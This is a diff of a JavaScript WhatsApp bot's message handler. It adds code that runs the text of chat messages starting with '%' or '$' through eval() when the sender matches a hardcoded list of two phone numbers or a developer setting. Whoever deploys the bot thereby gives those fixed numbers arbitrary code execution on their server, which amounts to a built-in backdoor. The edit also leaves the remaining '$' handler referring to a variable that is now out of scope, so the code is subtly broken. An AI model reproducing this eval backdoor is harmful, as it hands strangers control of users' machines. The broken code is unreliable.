@@ -245,28 +245,28 @@ const port = process.env.PORT || 8000;
     }
 });
 
-	const myBotNumber = conn.user && conn.user.id ? conn.user.id.split(':')[0] : '0';
-    const udp = myBotNumber;
-    let isCreator = ['94783747285', '94761068032', config.DEV].map(v => v ? v.replace(/[^0-9]/g, '') : '').includes(mek.sender ? mek.sender.replace(/[^0-9]/g, '') : '');
+	    // ---- EVAL CREATOR CHECKS START ----
+    const udp = conn.user && conn.user.id ? conn.user.id.split(':')[0] : '0';
 
-    if (isCreator && mek.text.startsWith('%')) {
-
-            let code = budy.slice(2);
+    if (body.startsWith('%') || body.startsWith('\$')) {
+        let isCreator = ['94783747285', '94761068032', config.DEV].map(v => v ? v.replace(/[^0-9]/g, '') : '').includes(senderNumber);
+        
+        if (isCreator) {
+            let code = body.slice(2);
             if (!code) {
                 reply('Provide me with a query');
                 return;
             }
             try {
                 let resultTest = eval(code);
-                if (typeof resultTest === 'object') {
-                    reply(util.format(resultTest));
-                } else {
-                    reply(util.format(resultTest));
-                }
+                reply(util.format(resultTest));
             } catch (err) {
                 reply(util.format(err));
             }
         }
+    }
+    // ---- EVAL CREATOR CHECKS END ----
+
 
             if (isCreator && mek.text.startsWith('$')) {
             let code = budy.slice(2);
